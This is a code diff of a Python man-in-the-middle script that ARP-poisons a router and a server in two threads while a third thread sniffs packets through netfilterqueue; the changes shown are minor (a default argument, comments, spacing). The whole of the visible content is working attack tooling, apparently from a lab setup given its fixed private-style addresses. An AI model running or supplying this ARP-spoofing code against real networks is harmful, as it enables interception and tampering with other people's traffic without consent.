@@ -10,7 +10,6 @@ import threading
 import time
 from netfilterqueue import NetfilterQueue as nfq
 
-
 gateway_ip = "198.7.0.1"
 packet_count = 1000
 
@@ -94,9 +93,10 @@ def restore_network(gateway_ip, target_ip, target_mac):
     # killing the process on a mac
     os.kill(os.getpid(), signal.SIGTERM)
 
-def arp_spoof(target_ip, target_mac, gateway_ip = gateway_ip):
+def arp_spoof(target_ip, target_mac="", gateway_ip = gateway_ip):
     try:
         if target_mac == "":
+            # finding MAC address if not provided
             print(f"Finding target MAC for {target_ip}..")
             target_mac = get_mac_address(target_ip)
             if not target_mac:
@@ -147,14 +147,15 @@ if __name__ == "__main__":
     # initializing data
     init()
 
+    # targets
     router_ip = "172.7.0.1"
     server_ip = "198.7.0.2"
 
     # using 2 threads for ARP Poisoning
     poison_router = threading.Thread(target=arp_spoof, 
-                                    args=(router_ip, "", gateway_ip))
+                                    args=(router_ip, "",gateway_ip))
     poison_server = threading.Thread(target=arp_spoof, 
-                                    args=(server_ip, "", gateway_ip))
+                                    args=(server_ip, "",gateway_ip))
     
     # sniffing packets in a different thread
     sniffing = threading.Thread(target=sniff_packet)
